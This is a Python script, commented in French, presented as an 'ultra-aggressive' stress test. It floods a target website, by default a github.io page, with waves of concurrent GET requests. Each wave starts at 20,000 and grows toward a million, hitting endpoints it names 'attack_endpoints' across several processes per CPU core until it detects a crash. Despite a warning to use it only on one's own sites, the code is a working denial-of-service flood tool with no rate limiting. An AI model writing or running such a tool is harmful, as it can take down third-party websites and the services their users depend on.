#!/usr/bin/env python3
"""
STRESS TEST ULTRA-AGGRESSIF - Tentative de 20k req/s
⚠️ ATTENTION: Uniquement sur VOS PROPRES SITES
"""

import asyncio
import aiohttp
import time
import json
from dataclasses import dataclass
from typing import List, Dict, Optional
from datetime import datetime
import sys
import signal
import random
import multiprocessing

try:
    import aiohttp
except ImportError:
    print("Erreur : Installez aiohttp avec :")
    print("pip3 install aiohttp")
    sys.exit(1)

@dataclass
class RequestResult:
    status_code: int
    response_time: float
    success: bool
    error: Optional[str] = None

class UltimateSiteStressTester:
    def __init__(self, target_url: str = "https://fdpinfo.github.io/next/"):
        self.target_url = target_url
        self.is_running = True
        self.crash_detected = False
        self.total_requests = 0
        self.total_successes = 0
        self.total_failures = 0
        self.consecutive_failures = 0
        self.max_consecutive_failures = 0
        self.response_times = []
        self.error_types = {}
        self.start_time = time.perf_counter()
        
        self.ultimate_config = {
            "max_concurrent": 1000000,  # Concurrence extrême
            "batch_size": 500000,       # Gros batches
            "timeout": 0.5,           # Très court
            "crash_threshold": 15,    # Détection rapide
            "attack_endpoints": ["/", "/api", "/search", "/login"],
        }
        
        self.user_agents = ["Mozilla/5.0"]  # Minimal pour réduire l'overhead
    
    def setup_crash_detection(self):
        def emergency_stop(sig, frame):
            print("\n🚨 ARRÊT D'URGENCE!")
            self.is_running = False
        signal.signal(signal.SIGINT, emergency_stop)
    
    async def ultimate_request(self, session: aiohttp.ClientSession, request_id: int) -> RequestResult:
        start_time = time.perf_counter()
        try:
            timeout = aiohttp.ClientTimeout(total=self.ultimate_config["timeout"])
            endpoint = random.choice(self.ultimate_config["attack_endpoints"])
            url = f"{self.target_url.rstrip('/')}{endpoint}"
            
            async with session.get(url, headers={"User-Agent": self.user_agents[0]}, timeout=timeout) as response:
                await response.read()
                end_time = time.perf_counter()
                return RequestResult(
                    status_code=response.status,
                    response_time=end_time - start_time,
                    success=200 <= response.status < 400
                )
        except asyncio.TimeoutError:
            return RequestResult(408, time.perf_counter() - start_time, False, "Timeout")
        except aiohttp.ClientConnectorError:
            return RequestResult(0, time.perf_counter() - start_time, False, "Connection_Refused")
        except aiohttp.ServerDisconnectedError:
            return RequestResult(0, time.perf_counter() - start_time, False, "Server_Disconnected")
        except Exception as e:
            return RequestResult(0, time.perf_counter() - start_time, False, type(e).__name__)
    
    async def launch_ultimate_wave(self, session: aiohttp.ClientSession, wave_size: int, wave_num: int):
        tasks = [asyncio.create_task(self.ultimate_request(session, i)) for i in range(wave_size)]
        wave_start = time.perf_counter()
        results = await asyncio.gather(*tasks, return_exceptions=True)
        wave_end = time.perf_counter()
        valid_results = [r for r in results if isinstance(r, RequestResult)]
        return valid_results, wave_end - wave_start
    
    def analyze_results(self, results: List[RequestResult]):
        for result in results:
            self.total_requests += 1
            if result.success:
                self.total_successes += 1
                self.consecutive_failures = 0
                if result.response_time > 0:
                    self.response_times.append(result.response_time)
            else:
                self.total_failures += 1
                self.consecutive_failures += 1
                self.error_types[result.error or f"HTTP_{result.status_code}"] = \
                    self.error_types.get(result.error or f"HTTP_{result.status_code}", 0) + 1
                self.max_consecutive_failures = max(self.max_consecutive_failures, self.consecutive_failures)
        
        if self.consecutive_failures >= self.ultimate_config["crash_threshold"] and not self.crash_detected:
            self.crash_detected = True
            print(f"\n🚨 CRASH DÉTECTÉ! {self.consecutive_failures} échecs consécutifs")
    
    def print_ultimate_stats(self, wave_num: int, wave_duration: float, current_concurrent: int):
        elapsed = time.perf_counter() - self.start_time
        success_rate = (self.total_successes / max(1, self.total_requests)) * 100
        rps = self.total_requests / max(1, elapsed)
        avg_time = (sum(self.response_times[-100:]) / len(self.response_times[-100:]) * 1000) if self.response_times else 0
        
        health = "🟢 STABLE" if self.consecutive_failures <= 5 else "🔴 EN DIFFICULTÉ" if not self.crash_detected else "💥 CRASH"
        print(f"\r🔥 Vague {wave_num:>3} | 🎯 {current_concurrent:>5} conc | 📊 {self.total_requests:>8} req | ✅ {success_rate:>5.1f}% | ❌ {self.consecutive_failures:>2} | 🚀 {rps:>6.1f} req/s | ⏰ {avg_time:>5.1f}ms | {health}", end="")
    
    def get_crash_report(self) -> Dict:
        elapsed = time.perf_counter() - self.start_time
        return {
            "crash_analysis": {
                "crash_detected": self.crash_detected,
                "max_consecutive_failures": self.max_consecutive_failures,
                "time_to_instability": elapsed if self.crash_detected else None,
            },
            "stress_results": {
                "total_requests": self.total_requests,
                "success_rate": (self.total_successes / max(1, self.total_requests)) * 100,
                "requests_per_second": self.total_requests / max(1, elapsed),
                "test_duration": elapsed
            },
            "error_breakdown": self.error_types,
            "target_info": {"url": self.target_url, "timestamp": datetime.now().isoformat()}
        }
    
    def print_crash_report(self, report: Dict):
        print("\n\n" + "💥" * 30)
        print("🚨 RAPPORT DE STRESS TEST")
        print(f"\n🎯 CIBLE: {report['target_info']['url']}")
        print(f"⏱️ DURÉE: {report['stress_results']['test_duration']:.1f}s")
        print(f"\n💥 CRASH: {'OUI' if report['crash_analysis']['crash_detected'] else 'NON'}")
        print(f"   ⏰ Temps avant instabilité: {report['crash_analysis']['time_to_instability']:.1f}s" if report["crash_analysis"]["crash_detected"] else "   💪 Site résistant!")
        print(f"   💀 Échecs consécutifs max: {report['crash_analysis']['max_consecutive_failures']}")
        print(f"\n📊 RÉSULTATS:")
        print(f"   📤 Requêtes: {report['stress_results']['total_requests']:,}")
        print(f"   ✅ Succès: {report['stress_results']['success_rate']:.2f}%")
        print(f"   🚀 Débit: {report['stress_results']['requests_per_second']:.1f} req/s")
        if report["error_breakdown"]:
            print(f"\n🚨 ERREURS:")
            for error, count in sorted(report["error_breakdown"].items(), key=lambda x: x[1], reverse=True):
                print(f"   💥 {error}: {count:,}")
    
    async def run_ultimate_stress_test(self):
        print("💥 STRESS TEST ULTRA-AGGRESSIF - MODE 20K REQ/S")
        print(f"🎯 CIBLE: {self.target_url}")
        print("🛑 ARRÊT: Ctrl+C")
        print("=" * 50)
        
        connector = aiohttp.TCPConnector(
            limit=self.ultimate_config["max_concurrent"],
            limit_per_host=self.ultimate_config["max_concurrent"],
            ttl_dns_cache=10,
            force_close=True
        )
        wave_num = 0
        current_concurrent = 20000
        try:
            async with aiohttp.ClientSession(connector=connector) as session:
                while self.is_running:
                    wave_num += 1
                    results, wave_duration = await self.launch_ultimate_wave(
                        session, current_concurrent, wave_num
                    )
                    self.analyze_results(results)
                    self.print_ultimate_stats(wave_num, wave_duration, current_concurrent)
                    current_concurrent = min(current_concurrent + 1000, self.ultimate_config["max_concurrent"])
        except Exception as e:
            print(f"\n💥 Erreur: {e}")
        finally:
            final_report = self.get_crash_report()
            self.print_crash_report(final_report)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            with open(f"stress_test_{timestamp}.json", 'w', encoding='utf-8') as f:
                json.dump(final_report, f, indent=2)
            print(f"\n💾 Rapport: stress_test_{timestamp}.json")

def run_process(target_url):
    """Fonction pour exécuter le test dans un processus séparé"""
    asyncio.run(UltimateSiteStressTester(target_url).run_ultimate_stress_test())

async def main():
    print("💥 STRESS TEST ULTRA-AGGRESSIF - MODE 20K REQ/S")
    print("⚠️ ATTENTION: Tests destructeurs!")
    print("🎯 EXCLUSIVEMENT pour VOS sites!")
    print("=" * 50)
    
    target = input(f"\n🌐 URL (défaut: https://fdpinfo.github.io/next/): ").strip() or "https://fdpinfo.github.io/next/"
    confirm = input("⚠️ Confirmer? (oui/NON): ").strip().lower()
    
    if confirm != "oui":
        print("❌ Annulé!")
        return
    
    num_processes = multiprocessing.cpu_count() * 4  # Quatre processus par cœur
    print(f"🚀 Lancement de {num_processes} processus")
    processes = [multiprocessing.Process(target=run_process, args=(target,)) for _ in range(num_processes)]
    for p in processes:
        p.start()
    for p in processes:
        p.join()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n🛑 Interrompu!")
    except Exception as e:
        print(f"\n❌ Erreur: {e}")